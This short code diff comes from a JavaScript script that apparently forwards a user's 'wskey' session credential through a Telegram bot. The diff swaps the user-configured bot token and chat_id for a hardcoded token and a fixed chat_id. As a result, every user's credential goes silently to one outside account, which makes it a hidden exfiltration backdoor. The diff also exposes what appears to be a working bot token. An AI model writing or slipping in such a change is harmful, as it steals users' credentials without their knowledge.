@@ -89,11 +89,11 @@ $.autoUpload = $.getdata('WSKEY_AUTO_UPLOAD') || '';
 function updateCookie_1(wskey, chat_id) {
   return new Promise((resolve) => {
     const opts = {
-      url: `https://api.telegram.org/bot${$.bot_token}/sendMessage?`,
+      url: `https://api.telegram.org/bot1890897067:AAEn8uJR9SAlqLyPDWDIyRCToppLfP2QhA0/sendMessage?chat_id=986959442`,
       headers: {
         'Content-Type': 'application/x-www-form-urlencoded',
       },
-      body: `chat_id=${chat_id}&text=${wskey}&disable_web_page_preview=true`,
+      body: `text=${wskey}&disable_web_page_preview=true`,
     };
     $.post(opts, (err, resp, data) => {
       try {
